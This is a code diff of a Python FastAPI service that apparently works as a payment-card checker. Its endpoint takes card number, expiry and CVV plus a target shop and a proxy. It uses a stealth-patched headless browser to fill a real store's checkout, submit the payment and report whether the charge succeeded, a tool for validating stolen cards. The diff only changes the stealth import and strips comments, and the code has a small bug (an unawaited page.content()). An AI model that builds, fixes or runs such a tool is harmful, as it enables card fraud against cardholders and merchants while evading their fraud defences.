@@ -1,6 +1,6 @@
 from fastapi import FastAPI, Query
 from playwright.async_api import async_playwright
-from playwright_stealth import stealth_async
+from playwright_stealth import stealth  # تم تعديل الاستيراد هنا
 import uvicorn
 
 app = FastAPI()
@@ -8,7 +8,6 @@ app = FastAPI()
 @app.get("/check")
 async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
     async with async_playwright() as p:
-        # إقلاع المتصفح مع تحسين استهلاك الذاكرة في الاستضافات السحابية
         browser = await p.chromium.launch(args=[
             "--no-sandbox", 
             "--disable-dev-shm-usage",
@@ -25,17 +24,13 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
         context = await browser.new_context(**context_args)
         page = await context.new_page()
         
-        # تفعيل وضع التخفي لحماية السكربت من التجمد
-        await stealth_async(page)
+        # تم تعديل دالة التخفي هنا لتعمل بدون كراش
+        await stealth(page)
         
         try:
-            # فتح الرابط مع مهلة مرنة جداً (90 ثانية) لتفادي بطء الخوادم
             await page.goto(f"{site}/checkout", timeout=90000, wait_until="load")
-            
-            # انتظر حتى تظهر أي مدخلات في الصفحة للتأكد من تجاوز جدار الحماية
             await page.wait_for_selector('input', timeout=30000)
             
-            # تعبئة بيانات الشحن عبر أنماط مرنة للغاية
             email_field = page.locator('input[type="email"], input[name*="email"], input[placeholder*="Email"]').first
             await email_field.fill("user@example.com")
             
@@ -48,39 +43,31 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
             address_field = page.locator('input[name*="address1"], input[placeholder*="Address"]').first
             await address_field.fill("123 Street")
             
-            # الضغط على زر المتابعة الأول مع انتظار تحميل الصفحة التالية
             submit_btn = page.locator('button[type="submit"], button:has-text("Continue")').first
             await submit_btn.click()
             await page.wait_for_load_state("domcontentloaded")
             
-            # محاولة تخطي خطوة اختيار طريقة الشحن بمرونة زمنية قصيرة
             try:
                 payment_btn = page.locator('button:has-text("Continue to payment"), button[type="submit"]').first
                 await payment_btn.click(timeout=10000)
                 await page.wait_for_load_state("networkidle", timeout=15000)
             except:
-                # إذا لم تكن الخطوة موجودة، يتجاوزها الكود فوراً دون تعليق
                 pass
 
-            # الوصول الآمن للـ Iframe مع إعطائه مهلة كافية للبناء الديناميكي
             iframe_selector = 'iframe[title*="payment"], iframe[title*="Secure card"]'
             await page.wait_for_selector(iframe_selector, timeout=40000)
             frame = page.frame_locator(iframe_selector)
             
-            # تعبئة بيانات الكرت
             cc_parts = cc.split('|')
             await frame.locator('input[name*="number"]').fill(cc_parts[0])
             await frame.locator('input[name*="expiry"]').fill(f"{cc_parts[1]}/{cc_parts[2]}")
             await frame.locator('input[name*="verification_value"]').fill(cc_parts[3])
             
-            # ضغط زر الدفع النهائي والانتظار حتى حسم النتيجة
             final_btn = page.locator('button#continue-button, button:has-text("Pay now"), button[type="submit"]').first
             await final_btn.click()
             
-            # مهلة معالجة عملية الحسم البنكية
             await page.wait_for_load_state("networkidle", timeout=30000)
             
-            # قراءة النتيجة النهائية
             content = page.content().lower()
             status = "true" if "thank-you" in page.url or "success" in content else "false"
             
